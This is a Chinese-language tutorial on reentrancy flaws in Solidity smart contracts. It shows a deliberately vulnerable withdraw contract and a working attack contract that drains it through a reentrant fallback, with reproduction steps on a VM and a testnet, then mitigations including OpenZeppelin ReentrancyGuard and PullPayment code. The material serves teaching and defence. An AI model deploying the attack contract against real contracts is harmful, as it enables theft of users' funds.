智能合约Re-Entrancy重⼊漏洞
===================

原理分析
----

外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。

```solidity
function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount)
    msg.sender.call.value(_amount)();
    balances[msg.sender] -= _amount;
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1c1c5bc20c9e577e5066f67ec8aa32fce36cf1fa.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1c1c5bc20c9e577e5066f67ec8aa32fce36cf1fa.png)

其中，`fallback`函数是关键

### fallback函数

当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，`fallback` 函数就会被调用。

向合约发送 send、transfer、call 消息时候都会调用 `fallback` 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 `fallback` 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 `fallback` 函数，这有可能导致循环调用。

而`fallback`函数是可以被重写的

如果构造一个 `fallback` 函数，函数里面也调用对方的 `withdraw` 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）

漏洞demo
------

```solidity
pragma solidity ^0.6.10;
contract Victim {
    mapping(address => uint) public balances;
    address public owner;

    //构造函数，设定合约所有者
    constructor() public {
        owner = msg.sender;
    }

    //接收资金转入
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    //提款
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        msg.sender.call{value: _amount}("");
        balances[msg.sender] -= _amount;
    }

    //查询余额
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
```

攻击合约
----

```solidity
contract Attack {
    Victim public victim;

    //设定受害者合约地址
    constructor(address _victimAddress) public {
        victim = Victim(_victimAddress);
    }

    //重写fallback
    fallback() external payable {
        if(address(victim).balance >= 1 ether){
            victim.withdraw(1 ether);
        }
    }

    //攻击，调用受害者的withdraw函数
    function attack() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    //查询余额
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
```

复现过程
----

### 虚拟机中

- 分别为受害者和攻击者创建一个合约

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b9a799842084aa472cd4827bf2f754df6192a358.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b9a799842084aa472cd4827bf2f754df6192a358.png)

- 用deposit函数为受害者设定一定余额

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b62bd8144bee20ca727b06b126bf036b770d49fd.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b62bd8144bee20ca727b06b126bf036b770d49fd.png)

- 检查受害者余额

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4b75e3316698c508e526473fecb580426e17efef.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-4b75e3316698c508e526473fecb580426e17efef.png)

- 进行攻击

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-bb0c62dc872ff3abc1876b877f97c6e7d0a4f722.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-bb0c62dc872ff3abc1876b877f97c6e7d0a4f722.png)

- 检查攻击者和受害者的余额

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-84e64de88ce9945ea3f0d6fe22786a5cf6ec8a5a.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-84e64de88ce9945ea3f0d6fe22786a5cf6ec8a5a.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-22985519d8375e42c044f41d1550721739023cad.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-22985519d8375e42c044f41d1550721739023cad.png)

### 测试链上

- 部署受害者合约

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-855602cf76b48310ae013e42d95ffb514d8b5b2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-855602cf76b48310ae013e42d95ffb514d8b5b2b.png)

- 部署攻击者合约

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-09f53446dacd8eaa5f0427ac7889c182de58df9e.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-09f53446dacd8eaa5f0427ac7889c182de58df9e.png)

- 为受害者合约打入2eth

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-50764a5a252508fab382cbc36c9e379417c8fa46.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-50764a5a252508fab382cbc36c9e379417c8fa46.png)

- 攻击

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e950ced242189cd7c95186bca12ae12a13668ffa.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e950ced242189cd7c95186bca12ae12a13668ffa.png)

- 结果

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cdea3b0137c53efe6f0db9363bff6e5744236147.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cdea3b0137c53efe6f0db9363bff6e5744236147.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5f04c4c1fad584e388c320675b70f3c01c826ff7.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-5f04c4c1fad584e388c320675b70f3c01c826ff7.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b4100745f7d3f71cde1d7bd112b84d97ba73810a.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-b4100745f7d3f71cde1d7bd112b84d97ba73810a.png)

### 重入次数

由于gas的限制，重入次数是有一定限制的

调整参数，实验出最高重入次数

可以在区块链浏览器上查询到重入的次数

[![](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-798b6d9aec2bb4983848dd9f5445e9c5f18e69c3.png)](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-798b6d9aec2bb4983848dd9f5445e9c5f18e69c3.png)

大约是9次

注意，一旦 out of gas 就会攻击失败。

规避建议
----

### 方法一

总是用 `send()`或`transfer()` 来发送 ether，而不是用 `call.value()`。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。

### 方法二

确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）

第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。

第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。

第三步，与其它合约的交互应该是任何函数的最后一步。

```solidity
require(balances[msg.sender] > amount); //检查
require(this.balance > amount); //检查
balances[msg.sender] -= amount; // 生效
to.call.value(amount)();  // 交互
```

### 方法三

1. 使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用

```solidity
bool reEntrancyMutex = false;
function withdraw(uint _amount) public {
    require(!reEntrancyMutex);
    reEntrancyMutex = true;
    require(balances[msg.sender] >= _amount);
    msg.sender.call{value: _amount}("");
    balances[msg.sender] -= _amount;
    reEntrancyMutex = false;
}
```

2. 使用OpenZeppelin官方的[ReentrancyGuard合约](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)的`nonReentrant` modifier。

在函数中增加`nonReentrant` modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。

当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加`nonReentrant` modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。

```solidity
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}
```

3. 使用采用pull payment模式，OpenZeppelin提供了[PullPayment合约](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol)。

其提供了`_asyncTransfer`函数，与`transfer`类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：`withdrawPayments`。

```solidity
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)

pragma solidity ^0.8.0;

import "../utils/escrow/Escrow.sol";

/**
 * @dev Simple implementation of a
 * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment]
 * strategy, where the paying contract doesn't interact directly with the
 * receiver account, which must withdraw its payments itself.
 *
 * Pull-payments are often considered the best practice when it comes to sending
 * Ether, security-wise. It prevents recipients from blocking execution, and
 * eliminates reentrancy concerns.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 *
 * To use, derive from the `PullPayment` contract, and use {_asyncTransfer}
 * instead of Solidity's `transfer` function. Payees can query their due
 * payments with {payments}, and retrieve them with {withdrawPayments}.
 */
abstract contract PullPayment {
    Escrow private immutable _escrow;

    constructor() {
        _escrow = new Escrow();
    }

    /**
     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.
     *
     * Note that _any_ account can call this function, not just the `payee`.
     * This means that contracts unaware of the `PullPayment` protocol can still
     * receive funds this way, by having a separate account call
     * {withdrawPayments}.
     *
     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.
     * Make sure you trust the recipient, or are either following the
     * checks-effects-interactions pattern or using {ReentrancyGuard}.
     *
     * @param payee Whose payments will be withdrawn.
     */
    function withdrawPayments(address payable payee) public virtual {
        _escrow.withdraw(payee);
    }

    /**
     * @dev Returns the payments owed to an address.
     * @param dest The creditor's address.
     */
    function payments(address dest) public view returns (uint256) {
        return _escrow.depositsOf(dest);
    }

    /**
     * @dev Called by the payer to store the sent amount as credit to be pulled.
     * Funds sent in this way are stored in an intermediate {Escrow} contract, so
     * there is no danger of them being spent before withdrawal.
     *
     * @param dest The destination address of the funds.
     * @param amount The amount to transfer.
     */
    function _asyncTransfer(address dest, uint256 amount) internal virtual {
        _escrow.deposit{value: amount}(dest);
    }
}
```